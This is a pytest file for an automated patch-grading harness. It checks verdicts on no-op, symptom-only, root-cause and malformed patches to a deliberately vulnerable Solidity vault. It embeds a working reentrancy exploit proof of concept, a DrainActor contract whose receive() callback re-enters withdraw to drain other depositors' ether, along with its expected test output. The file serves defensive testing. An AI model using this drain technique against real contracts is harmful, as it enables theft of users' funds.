# Copyright 2026 Anthropic PBC
# SPDX-License-Identifier: Apache-2.0
"""End-to-end grader validation against real Docker (solidity-canary, no LLM).

Hand-crafted patches with known correct verdicts, asserting grade_patch
agrees. Every assertion is a deterministic oracle (forge build/test exit
code + `has_failures` over `forge test --json`); re-attack is unit-tested
separately with mocks since it needs an LLM in the loop.

Skipped if Docker can't spawn containers (set VULN_PIPELINE_DOCKER_RUNTIME=runsc
on hosts where the default runtime is unavailable).
"""

from __future__ import annotations

import asyncio
from pathlib import Path

import pytest
from harness import docker_ops
from harness.artifacts import CrashArtifact
from harness.config import TargetConfig
from harness.patch_grade import grade_patch

REPO = Path(__file__).resolve().parents[1]
SOLIDITY_CANARY = TargetConfig.load(REPO / "targets" / "solidity-canary")

# Exploit PoC: a Foundry test proving ReentrancyVault.withdraw lets a
# reentrant caller drain more than it ever deposited (external call before
# the unchecked debit). DrainActor deposits 1 ether then calls withdraw(1
# ether); its receive() callback re-enters withdraw(1 ether) twice more
# while credits[attacker] is still stale, draining 3x the deposit out of an
# innocent depositor's 3-ether liquidity. The test asserts the attacker (and
# the vault) end up whole; on the vulnerable contract that assertion fails,
# which IS the finding — see harness/finding_parser.py's `has_failures`.
_EXPLOIT_POC = b"""\
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {ReentrancyVault} from "../../src/ReentrancyVault.sol";

contract DrainActor {
    ReentrancyVault private immutable vault;
    uint256 private reentries;
    uint256 private constant MAX_REENTRIES = 2;

    constructor(ReentrancyVault target) payable {
        vault = target;
    }

    function attack() external {
        vault.deposit{value: 1 ether}();
        vault.withdraw(1 ether);
    }

    receive() external payable {
        if (reentries < MAX_REENTRIES && address(vault).balance >= 1 ether) {
            reentries++;
            try vault.withdraw(1 ether) {} catch {}
        }
    }
}

contract ExploitReentrancyDrainVaultTest {
    function test_Exploit_Reentrancy_DrainVault() public {
        ReentrancyVault vault = new ReentrancyVault();
        vault.deposit{value: 3 ether}();

        DrainActor attacker = new DrainActor{value: 1 ether}(vault);
        attacker.attack();

        require(address(attacker).balance <= 1 ether, "audit: exploit should not drain beyond attacker's own deposit");
        require(address(vault).balance >= 3 ether, "audit: exploit should not drain other depositors' funds");
    }
}
"""

REENTRANCY_CRASH = CrashArtifact(
    poc_path="/work/test/audit/Exploit_Reentrancy_DrainVault.t.sol",
    poc_bytes=_EXPLOIT_POC,
    reproduction_command=(
        "forge test --offline --json "
        "--match-path 'test/audit/Exploit_Reentrancy_DrainVault.t.sol' "
        "--match-test '^test_Exploit_Reentrancy_DrainVault\\(\\)$'"
    ),
    crash_type="Reentrancy",
    crash_output=(
        '{"test/audit/Exploit_Reentrancy_DrainVault.t.sol:ExploitReentrancyDrainVaultTest":'
        '{"duration":"220µs 262ns","test_results":{"test_Exploit_Reentrancy_DrainVault()":'
        '{"status":"Failure","reason":"audit: exploit should not drain beyond attacker\'s own deposit",'
        '"counterexample":null,"logs":[],"decoded_logs":[],"kind":{"Unit":{"gas":433770}},'
        '"traces":[],"labeled_addresses":{},"duration":"101µs 864ns","breakpoints":{},'
        '"gas_snapshots":{}}},"warnings":[]}}'
    ),
    exit_code=1,
)


def _docker_available() -> bool:
    if not docker_ops.image_exists(SOLIDITY_CANARY.image_tag):
        return False
    try:
        docker_ops.run(SOLIDITY_CANARY.image_tag, name="pgrade_probe")
        return True
    except RuntimeError:
        return False
    finally:
        docker_ops.rm("pgrade_probe")


pytestmark = pytest.mark.skipif(
    not _docker_available(),
    reason="Docker can't spawn containers (set VULN_PIPELINE_DOCKER_RUNTIME)",
)


def _grade(diff_path: str):
    diff = (REPO / diff_path).read_bytes()
    return asyncio.run(
        grade_patch(
            SOLIDITY_CANARY,
            REENTRANCY_CRASH,
            diff,
            model="unused",
            container_name="pgrade_e2e",
            run_reattack=False,
        )
    )


def test_noop_diff_passes_t0_fails_t1():
    """A patch that changes nothing meaningful must fail at T1."""
    v = _grade("tests/fixtures/solidity_canary_noop.diff")
    assert v.t0_builds
    assert not v.t1_poc_stops
    assert "Failure" in v.evidence.get("t1", "")
    assert not v.passed


def test_crashsite_diff_passes_t0_t1():
    """Symptom-only fix (blocks only a same-amount reentrant withdrawal)
    passes T1 for the specific PoC but is wrong — a different-amount
    reentrant withdrawal would still drain the vault. Re-attack would catch
    it (mocked unit test covers that path)."""
    v = _grade("tests/fixtures/solidity_canary_crashsite.diff")
    assert v.t0_builds
    assert v.t1_poc_stops
    assert v.t2_tests_pass


def test_golden_diff_passes_all():
    """Root-cause fix (checks-effects-interactions) passes T0+T1."""
    v = _grade("tests/fixtures/solidity_canary_golden.diff")
    assert v.t0_builds
    assert v.t1_poc_stops
    assert v.passed


def test_malformed_diff_fails_t0():
    """Garbage diff bytes must fail at T0 (apply step)."""
    v = asyncio.run(
        grade_patch(
            SOLIDITY_CANARY,
            REENTRANCY_CRASH,
            b"not a diff\n",
            model="unused",
            container_name="pgrade_e2e",
            run_reattack=False,
        )
    )
    assert not v.t0_builds
    assert "apply" in v.evidence.get("t0", "")
